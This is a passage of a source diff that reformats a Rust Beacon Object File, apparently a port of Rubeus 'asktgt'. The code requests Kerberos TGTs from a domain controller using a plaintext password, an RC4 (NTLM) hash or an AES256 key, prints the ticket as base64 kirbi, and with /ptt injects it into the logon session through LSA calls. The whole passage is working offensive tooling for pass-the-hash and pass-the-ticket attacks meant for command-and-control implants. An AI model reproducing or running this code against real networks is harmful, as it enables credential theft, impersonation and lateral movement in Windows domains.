+        b'A'..=b'Z' => (c - b'A') as u32,
+        b'a'..=b'z' => (c - b'a' + 26) as u32,
+        b'0'..=b'9' => (c - b'0' + 52) as u32,
+        b'+' => 62,
+        b'/' => 63,
+        _ => 0,
     }
 }
 
 fn import_ticket(ticket_b64: &str) {
     let ticket_bytes = match base64_decode_vec(ticket_b64) {
         Some(b) if !b.is_empty() => b,
-        _ => { eprintln!("[X] Failed to decode ticket"); return; }
+        _ => {
+            eprintln!("[X] Failed to decode ticket");
+            return;
+        }
     };
 
     unsafe {
         let mut hlsa: HANDLE = core::ptr::null_mut();
-        if LsaConnectUntrusted(&mut hlsa) < 0 { eprintln!("[X] Failed to get LSA handle"); return; }
+        if LsaConnectUntrusted(&mut hlsa) < 0 {
+            eprintln!("[X] Failed to get LSA handle");
+            return;
+        }
 
-        let krb = LSA_STRING { Length: 8, MaximumLength: 9, Buffer: b"kerberos\0".as_ptr() as *mut u8 };
+        let krb = LSA_STRING {
+            Length: 8,
+            MaximumLength: 9,
+            Buffer: b"kerberos\0".as_ptr() as *mut u8,
+        };
         let mut auth_pkg = 0u32;
         if LsaLookupAuthenticationPackage(hlsa, &krb, &mut auth_pkg) < 0 {
             LsaDeregisterLogonProcess(hlsa);
@@ -842,7 +1105,8 @@ fn import_ticket(ticket_b64: &str) {
         req.KerbCredOffset = core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() as u32;
         core::ptr::copy_nonoverlapping(
             ticket_bytes.as_ptr(),
-            buf.as_mut_ptr().add(core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>()),
+            buf.as_mut_ptr()
+                .add(core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>()),
             ticket_bytes.len(),
         );
 
@@ -850,8 +1114,13 @@ fn import_ticket(ticket_b64: &str) {
         let mut resp_size = 0u32;
         let mut proto_status = 0i32;
         let status = LsaCallAuthenticationPackage(
-            hlsa, auth_pkg, buf.as_ptr() as *const c_void, submit_size as u32,
-            &mut resp, &mut resp_size, &mut proto_status,
+            hlsa,
+            auth_pkg,
+            buf.as_ptr() as *const c_void,
+            submit_size as u32,
+            &mut resp,
+            &mut resp_size,
+            &mut proto_status,
         );
         if status < 0 || proto_status < 0 {
             eprintln!("[X] Ticket not imported.");
@@ -862,13 +1131,14 @@ fn import_ticket(ticket_b64: &str) {
     }
 }
 
-
 #[rustbof::main]
 fn main(args: *mut u8, len: usize) {
     println!("[*] Action: Ask TGT\n");
 
     if len == 0 {
-        eprintln!("[X] /user:X required. Usage: /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac]");
+        eprintln!(
+            "[X] /user:X required. Usage: /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac]"
+        );
         return;
     }
 
@@ -877,7 +1147,10 @@ fn main(args: *mut u8, len: usize) {
 
     let user = match get_param(&params, "/user:") {
         Some(u) => u,
-        None => { eprintln!("[X] /user:X must be supplied!"); return; }
+        None => {
+            eprintln!("[X] /user:X must be supplied!");
+            return;
+        }
     };
 
     let password = get_param(&params, "/password:");
@@ -913,7 +1186,10 @@ fn main(args: *mut u8, len: usize) {
 
     let api = match load_crypt_api() {
         Some(a) => a,
-        None => { eprintln!("[X] Failed to load crypto modules"); return; }
+        None => {
+            eprintln!("[X] Failed to load crypto modules");
+            return;
+        }
     };
 
     let (key, etype) = if let Some(pw) = password {
@@ -925,50 +1201,70 @@ fn main(args: *mut u8, len: usize) {
             String::new()
         } else {
             let mut s = String::new();
-            for c in domain.chars() { s.push(c.to_ascii_uppercase()); }
-            for c in user.chars() { s.push(c); }
+            for c in domain.chars() {
+                s.push(c.to_ascii_uppercase());
+            }
+            for c in user.chars() {
+                s.push(c);
+            }
             s
         };
         match derive_key(&api, et, pw, &salt) {
             Some(k) => (k, et),
-            None => { eprintln!("[X] Failed to derive key from password"); return; }
+            None => {
+                eprintln!("[X] Failed to derive key from password");
+                return;
+            }
         }
     } else if let Some(h) = rc4_hash {
         match hex_decode(h) {
             Some(k) if k.len() == 16 => (k, RC4_HMAC),
-            _ => { eprintln!("[X] Invalid RC4 hash (expected 32 hex chars)"); return; }
+            _ => {
+                eprintln!("[X] Invalid RC4 hash (expected 32 hex chars)");
+                return;
+            }
         }
     } else if let Some(h) = aes256_hash {
         match hex_decode(h) {
             Some(k) if k.len() == 32 => (k, AES256_CTS),
-            _ => { eprintln!("[X] Invalid AES256 hash (expected 64 hex chars)"); return; }
+            _ => {
+                eprintln!("[X] Invalid AES256 hash (expected 64 hex chars)");
+                return;
+            }
         }
     } else {
-        eprintln!("[X] No credential supplied"); return;
+        eprintln!("[X] No credential supplied");
+        return;
     };
 
-    println!("[*] Building AS-REQ (w/ preauth) for: '{}\\{}'", domain, user);
+    println!(
+        "[*] Building AS-REQ (w/ preauth) for: '{}\\{}'",
+        domain, user
+    );
 
     let as_req = match build_as_req(&api, user, &domain, &key, etype, !nopac) {
         Some(r) => r,
-        None => { eprintln!("[X] Failed to build AS-REQ"); return; }
+        None => {
+            eprintln!("[X] Failed to build AS-REQ");
+            return;
+        }
     };
 
     let response = match send_to_kdc(&dc, &as_req) {
         Some(r) => r,
-        None => { eprintln!("[X] Failed to communicate with KDC at {}:88", dc); return; }
+        None => {
+            eprintln!("[X] Failed to communicate with KDC at {}:88", dc);
+            return;
+        }
     };
 
-    match handle_as_rep(&api, &response, &key, etype) {
-        Some(ticket_b64) => {
-            println!("[+] TGT request successful!");
-            println!("[*] base64(ticket.kirbi):\n\n{}\n", ticket_b64);
+    if let Some(ticket_b64) = handle_as_rep(&api, &response, &key, etype) {
+        println!("[+] TGT request successful!");
+        println!("[*] base64(ticket.kirbi):\n\n{}\n", ticket_b64);
 
-            if ptt {
-                println!("[*] Importing ticket...");
-                import_ticket(&ticket_b64);
-            }
+        if ptt {
+            println!("[*] Importing ticket...");
+            import_ticket(&ticket_b64);
         }
-        None => {}
     }
 }
